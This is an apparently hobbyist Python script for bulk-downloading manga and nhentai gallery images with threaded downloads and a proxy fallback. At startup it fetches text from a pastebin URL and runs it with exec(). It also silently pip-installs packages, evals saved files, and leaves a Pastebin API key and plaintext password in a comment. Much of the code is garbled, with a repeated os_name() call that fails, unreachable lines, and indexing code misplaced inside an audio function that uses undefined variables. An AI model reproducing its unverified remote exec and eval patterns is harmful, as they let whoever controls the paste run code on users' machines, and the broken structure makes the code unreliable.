#: *****************************************************************************
#:                    This code was created by Ratul Hasan                     *
#:                     So comlpete credit goes to him(me)                      *
#: *****************************************************************************
#: Sharing this code without my permission is not allowed                      *
#: *****************************************************************************
#: This code was created based on IDLE, Pydroid(Android), qPython(Android) etc.*
#: So most online/web site based idle(i.e: Sololearn) can't run this code      *
#: properly.                                                                   *
#: *****************************************************************************
#: If there is any error or you want to help please let me know.               *
#: e-mail: wwwqweasd147@gmail.com                                              *
#: *****************************************************************************


                            #>>>>>>update>>>>>
                        #=========================
#>>>>>used re.compile to speed up
#>>>>>added nhentai support wiht proxy



from re import search,compile as compiler

# from bs4 import BeautifulSoup as bs
# 
from os import makedirs, remove
from os.path import exists, isdir
from platform import system as os_name
from threading import Thread as Process
from sys import executable as sys_executable
from subprocess import call as subprocess_call
from random import choice
import time

parser='html.parser'
img=('jpeg','jpg','png','gif', 'webp', 'bmp', 'tif')
os_name=os_name()
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
who_r_u='https://www.myinstants.com/media/sounds/who_r_u_1.mp3'
yamatte= ['https://www.myinstants.com/media/sounds/yamatte.mp3','https://www.myinstants.com/media/sounds/ara-ara.mp3', 'https://www.myinstants.com/media/sounds/ara-ara2.mp3']
yes= ('y', 'yes', 'yeah', 'sure', 'ok', 'lets go', "let's go", 'start', 'yep', 'yeap', 'well y', 'well yes', 'well yeah', 'well sure', 'well ok', 'well lets go', "well let's go", 'well start', 'well yep', 'well yeap', 'actually y', 'actually yes', 'actually yeah', 'actually sure', 'actually ok', 'actually lets go', "actually let's go", 'actually start', 'actually yep', 'actually yeap')
no = ('n', 'no', 'na', 'nah', 'nope', 'stop', 'quit', 'exit', 'not really', 'no', 'not at all', 'never', 'well n', 'well no', 'well na', 'well nah', 'well nope', 'well stop', 'well quit', 'well exit', 'well not really', 'well no', 'well not at all', 'well never', 'actually n', 'actually no', 'actually na', 'actually nah', 'actually nope', 'actually stop', 'actually quit', 'actually exit', 'actually not really', 'actually no', 'actually not at all', 'actually never')
cond=yes+no
condERR = "Sorry,  I can't understand what you are saying. Just type yes or no.   "

def asker(out=''):
	print(out)
	Ques2 = input().lower()
	#Ques2 = Ques2
	while Ques2 not in cond:
		print(condERR)
		Ques2 = input().lower()
		#Ques2 = Ques2
	if Ques2 in cond:
		if Ques2 in yes:
			return True
		else:
			return False


os_name=os_name()
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
def loc(x, os_name=os_name):
	"""to fix dir problem"""
	if os_name == 'Windows':
		return x.replace('/', '\\')
	else:
		return x.replace('\\', '/')
def get_file_ext(x):
	return x.split('.')[-1]
def get_file_name(x):
	return loc(x,'linux').split('/')[-1]

def reader(direc):
	with open(loc(direc)) as f:
		return f.read()
#print(isdir('data/projects/Sao manga rip'))

def writer(fname, mode, data, dir=0):
	if dir == 0:
		with open(fname, mode) as file:
			file.write(data)
	else:
		locs=loc(dir)
		if exists(locs):
			if locs.endswith('/'):
				with open(loc(locs + fname), mode) as f:
					f.write(data)
			else:
				with open(loc(locs + '/' + fname), mode) as f:
					f.write(data)
		else:
			makedirs(locs)
			writer(fname, mode, data, locs)

def install(pack, alias=0):
	"""Just install package"""

	if alias == 0:
		alias = pack

	subprocess_call([sys_executable, "-m", "pip", "install", "--user",'--disable-pip-version-check','--quiet', pack])

try:
	import requests
except:
	install('requests')
	import requests
try:
	from bs4 import BeautifulSoup as bs
except:
	install('beautifulsoup4')
	from bs4 import BeautifulSoup as bs

try:
	update=requests.get('https://pastebin.com/raw/NrB5mbHA',headers=headers).content
	
except:
	print("Error code: 005\nNo internet connection!\nThe program will break in 5 seconds")
	time.sleep(5)
	raise ValueError
exec(update)
#print(update)
#print(aiii)
#
#def upload_paste(data,f_name):
"""if True:
	api_dev_key= "f7e117d452fed3df6e5cc1ea2eee658a"
	#my_key = PastebinAPI.generate_user_key( ,api_dev_key=api_dev_key, username="DarKnighTitan", password="147852369aA..")
	x=PastebinAPI.paste(self,api_dev_key=api_dev_key, api_paste_code="hello world", api_user_key = None, paste_name = "hi", paste_format = None, paste_private = None, paste_expire_date = None)
	print(x)
"""

def delete_last_line():
    "Use this function to delete the last line in the STDOUT"

    #cursor up one line
	print('\x1b[1A',end='')
    #delete last line
	print('\x1b[2K',end='')
if os_name=='Windows':
	import mplay4

	#import volume_control
#writer('who_r_u.mp3','wb',requests.get(who_r_u, headers=headers).content,'Data/.temp')

errors=0
done=0
def distribute(lists,task_id):
	global total,done, errors
	task_id=str(task_id)
	if existing_found:
		if exists('data/projects/'+Project+'/t'+task_id+'.txt'):
			res=eval(open('data/projects/'+Project+'/t'+task_id+'.txt').read())
		
		else:
			res=0
	else: res=0
	done+=res
	for i in lists:
		#sys.stdout.write("\033[2K")
		delete_last_line()
		print('Downloadng ['+ str(done+1) + '/'+str(total)+']')
		
		#sys.stdout.flush()
		
		if lists.index(i)>=res:
			try:
				file=requests.get(i[0], headers=headers)
				if file:
					writer(get_file_name(i[0]),'wb',file.content,'Projects/'+Project+'/'+sub_dirs[i[1]])
					writer('t'+task_id+'.txt', 'w',str(res),'data/projects/'+Project)
				else:
					raise requests.ConnectionError
			except:
				writer('errors.txt', 'a',str(i)+'\n','data/projects/'+Project)
				errors+=1
			res+=1
			done+=1


#import time

if not exists('data/projects.db'):
	writer('projects.db','a','','data')
all_list=set()
patrial_do_all=0
homepage=''
def list_writer(link, types, file_link_starts,n,special=None, soup=None):
	global all_list
	homepage_searcher=compiler('(https?://[^/]*)')
	#print(file_link_starts)
	start_checker=compiler('^'+file_link_starts)
	if special != None and special.startswith('nhentai'):
		#link='https://'+special+'/g/'+link
		#page = requests.get(link,headers=headers)
		#soup=bs(page.content, parser)
		#title=soup.find("h1").getText()
		#print("Indexing from",title)
		if special=="nhentai.to":
			to_search= compiler("https://nhentai.to/galleries/\d*/")
			for imgs in soup.find_all('img'):
				img_link=imgs.get('data-src')
				if img_link== None:
					img_link=imgs.get('src')
				if img_link.startswith('/'):
					img_link='https://nhentai.to' +(img_link.replace('t',''))
				if to_search.search(img_link)!=None:
					all_list.add((img_link,n))
		elif special=="nhentai.net":
			net_search=compiler("https://i.nhentai.net/galleries/\d*/")
			for imgs in soup.find_all('img'):
				img_link=imgs.get('data-src')
				if img_link== None:
					img_link=imgs.get('src')
				#print(img_link)
				if '/thumb.' in img_link:
					continue
				if 'cover' not in img_link:
					img_link= img_link.replace('s://t.','s://i.')[::-1].replace('t','',1)[::-1]
				if net_search.search(img_link)!=None:
					all_list.add((img_link,n))
	else:
		page = requests.get(link,headers=headers)
		soup=bs(page.content, parser)
		# print(page.content)
		# time.sleep(10000)
		# li=[]
		for imgs in soup.find_all('img'):
			img_link=imgs.get('data-src')
			if img_link== None:
				img_link=imgs.get('src')
				if img_link.startswith('/'):
					img_link=homepage_searcher.search(link).group()+img_link
			if start_checker.search(str(img_link))!=None and img_link.endswith(types):
				if img_link.startswith('//i') and '.imggur.net' in img_link:
					img_link="https:"+img_link
				#print(img_link)
				all_list.add((img_link,n))
				# li+=[http]
			# print(http)
		# li1=(link.get('src')  if  )
		# for i in li1:
		# 	print(i, search(file_starts, i)!=None)
			

def nhantai_link(link):
	code=search('https://nhentai.[^/]*/g/((\d)*)',link)
	#print(code)
	if code==None:
		return False, False
	code=code.groups()[0]
	#print(code)
	
	try:
		link_y='https://nhentai.net/g/'+code+'/'
		page = requests.get(link_y,headers=headers, timeout=2)
		if page:
			site=".net"
		else:
			raise requests.ConnectionError
			#link_y='https://nhentai.to/g/'+code+'/'
			#page = requests.get(link_y,headers=headers)
			#site='.to'
			# site="https://nhentai.net/"
			# thumb_pattern="https://t.nhentai.net/galleries/\d/\dt."

	except (requests.ConnectionError,requests.exceptions.ConnectTimeout,requests.exceptions.ReadTimeout):
		print('nhentai.net server is not reachable, trying proxy server...')
		link_y='https://nhentai.to/g/'+code+'/'
		page = requests.get(link_y,headers=headers)
		site='.to'
		
		# list_writer(link,img, )
		#site='.to'
	if page:
		soup=bs(page.content, parser)
		title=soup.find("h1").getText()
		print("Indexing from",title)
		list_writer(code,img,'',0,'nhentai'+site,soup)
		return link_y, title
	else:
		print("Error code: 005\nLink not found, this program will crash and close in 3 seconds")
		time.sleep(3)
		if os_name=='Windows':
				remove('data/.temp/yamatte.mp3')
				mplay4.set_win_vol(ex)
		raise ValueError

def check_existance():
	global Project
	existing_found= False
	Project=input('Enter Batch download directory (Project name): ')
	if Project in open('data/projects.db').read().split('\n'):
		print('Project name found!')
		#system('ls')
		if exists('data/projects/'+Project+'.proj') and exists('data/projects/'+Project+'.list'):
			try:
				with open('data/projects/'+Project+'.proj') as f:
					print('db found')
					#db=
					existing_data=f.read().split('\n')
					main_link=existing_data[0]
					link_startswith=existing_data[1]
					try:
						file_types=eval(existing_data[2])
						file_starts=existing_data[3]
						try:
							sub_dirs=eval(existing_data[4]) #sub directory list
							proj_good= True
						except:
							proj_good= False
							print('Corrupted Data! Error code: 002')
					except:
							proj_good= False
							print('Corrupted Data! Error code: 004')

				with open('data/projects/'+Project+'.list') as f:
					try:
						file=f.read()
						#print(f"'{file}'")
						if file.strip()=='': raise ValueError
						all_list=eval(str(file))
						print('list found')
						list_good= True
					except:
						list_good= False
						print('Corrupted Data! Error code: 003')
					
				#print(x)
				if proj_good and list_good:
					print('============ Realoaded =============')
					existing_found= True

			except IndexError:
				# existing_found=0
				print('Corrupted Data! Error code: 001\n')
				#print('error')

			
			#download_files(listx,state)
		else:
			# existing_found=0
			print('Insufiicient Data!\n')
	if existing_found:
		return True,main_link, link_startswith, file_types, file_starts, sub_dirs, list(all_list)
	else:
		return existing_found
	link=input("Enter the link: ")

if os_name=='Windows':
	def plat_yamatte(vol):
		writer('yamatte.mp3','wb',requests.get(choice(yamatte), headers=headers).content,'Data/.temp')
		ex=mplay4.ex_vol
		mplay4.set_win_vol(80)
		mplay4.load('data/.temp/yamatte.mp3').play()
		time.sleep(8)
		remove('data/.temp/yamatte.mp3')
		mplay4.set_win_vol(ex)

	#page = requests.get(link, headers=headers)
	soup=bs(page.content, parser)
	start=input("Links Starts With: ")
	li1=set([link.get('href') for link in soup.find_all('a')])
	if start=='': start=link

	file_types1=input("Enter file formats (separate multiple by commas) *no need to add . in formats (ie: png, jpg,mp3) or just write the category (ie: image, music, video): ")
	if file_types1=='image':
		file_types=img
	else:
		file_types= tuple(i.strip(i) for i in file_types1.split(','))

	file_starts=input("File Links Starts With (if known or need to be specified): ")
	path=Project[:]

	#if start[-1'/'): start+='/'
	#if start.startswith(): start=start[1:]
	sub_dirs=[]
	len_li1=str(len(li1))
	n=0
	print('\n\n')
	for i in li1:
		delete_last_line()
		print('Indexing ['+ str(n+1) + '/'+len_li1+'] '+i)
		
		#sys.stdout.flush()
		#print(link)
		locs=i
		if locs[-1]=='/':
			locs=locs[:-1]
		sub_dirs+=[locs.split('/')[-1]]
		
		
		if  do_all==0 and i.startswith('/'):
			print("Partial link detected - ",link,"\nSearching for home page.")
			#print(start)
			HP=search('(https?://[^/]*)',start)
			#print(HP)
			if HP!=None:
				print("Home page detected: ", HP.group())
				io= input("Is this the homepage? \n(y for yes\nn for no\na for all)\n")
				if io=="a":
					do_all=1
					io='y'
				if io=='y':
					starts=HP.group()
				elif io=='n':
					starts= input("Enter the home page: ")
					io2=input('Is it for all other links?(y/n)')
					if io2=='y': 
						do_all=1
					elif io2!='n':
						print("Invalid input!")
						raise InterruptedError
				else:
					print("Invalid input!")
					raise InterruptedError
		
		
		#print(link)
		#print(sub_dirs)
		if (starts+i).startswith(start):
			list_writer(starts+i,start, file_types, file_starts,n)
		
		#print(i)
		n+=1
		#sys.stdout.write("\033[2K")
	all_list=list(all_list)
	writer('projects.db','a',Project+'\n','data')
	writer(Project+'.list','w',str(all_list),'data/projects')
	writer(Project+'.proj','a',link+'\n','data/projects')
	writer(Project+'.proj','a',start+'\n','data/projects')
	writer(Project+'.proj','a',str(file_types)+'\n','data/projects')
	writer(Project+'.proj','a',file_starts+'\n','data/projects')
	writer(Project+'.proj','a',str(sub_dirs)+'\n','data/projects')
print('\n\n')
total=len(all_list)


if exists('data/projects/'+Project+'/t'+'errors.txt'):
	errors=len(open('data/projects/'+Project+'/t'+'errors.txt').readlines())
else:
	errors=0

#print(all_list)

t11= Process(target=distribute, args=(all_list[::10],1))
t2= Process(target=distribute, args=(all_list[1::10],2))
t3= Process(target=distribute, args=(all_list[2::10],3))
t4= Process(target=distribute, args=(all_list[3::10],4))
t5= Process(target=distribute, args=(all_list[4::10],5))
t6= Process(target=distribute, args=(all_list[5::10],6))
t7= Process(target=distribute, args=(all_list[6::10],7))
t8= Process(target=distribute, args=(all_list[7::10],8))
t9= Process(target=distribute, args=(all_list[8::10],9))
t10= Process(target=distribute, args=(all_list[9::10],10))

##sleep(.5)

t11.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()

t11.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
t8.join()
t9.join()
t10.join()

with open('data/projects/'+Project+'/errors.txt') as f:
	errs= [eval(i) for i in f.readlines()]
	distribute(errs,11)

'''Sao manga rip
https://sword-artonline.com/
https://sword-artonline.com/manga/
image
https://1.bp.blogspot.com/
'''

'''Accel world
https://www.mangareader.net/accel-world

image
//i\d+.imggur.net/accel-world/
'''
'''Accel world
https://mangapill.com/manga/99/accel-world
https://mangapill.com/chapters/99-100
image
https://cdn.read7deadlysins.com/file/mangap/99/100
'''

